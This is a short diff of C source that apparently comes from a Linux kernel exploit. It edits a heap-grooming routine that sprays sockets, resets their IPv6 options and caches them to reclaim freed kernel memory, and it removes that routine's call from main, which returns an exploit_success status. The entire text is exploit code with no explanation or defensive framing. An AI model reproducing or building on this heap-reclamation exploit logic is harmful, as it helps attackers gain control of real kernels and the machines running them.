@@ -348,19 +348,17 @@ void sidt(unsigned long long* addr, unsigned short* size) {
 void aggressive_heap_reclamation() {
     for (int pass = 0; pass < AGGRESSIVE_RECLAIM_PASSES; pass++) {
         int reclaim_sockets[AGGRESSIVE_SOCKETS_PER_PASS];
-        int created_count = 0;
 
         for (int i = 0; i < AGGRESSIVE_SOCKETS_PER_PASS; i++) {
             reclaim_sockets[i] = fast_new_socket();
-            if (reclaim_sockets[i] >= 0) {
-                created_count++;
+
+            if (reclaim_sockets[i] >= 0)
                 reset_ipv6_opts(reclaim_sockets[i]);
-            }
         }
 
         nanosleep(NANOSLEEP_10US, NULL);
 
-        for (int i = created_count - 1; i >= 0; i--) {
+        for (int i = AGGRESSIVE_SOCKETS_PER_PASS - 1; i >= 0; i--) {
             if (reclaim_sockets[i] >= 0)
                 cache_socket(reclaim_sockets[i]);
         }
@@ -625,7 +623,6 @@ int main() {
     }
 
     comprehensive_cleanup(&cleanup_state);
-    aggressive_heap_reclamation();
 
     return exploit_success ? 0 : 1;
 }
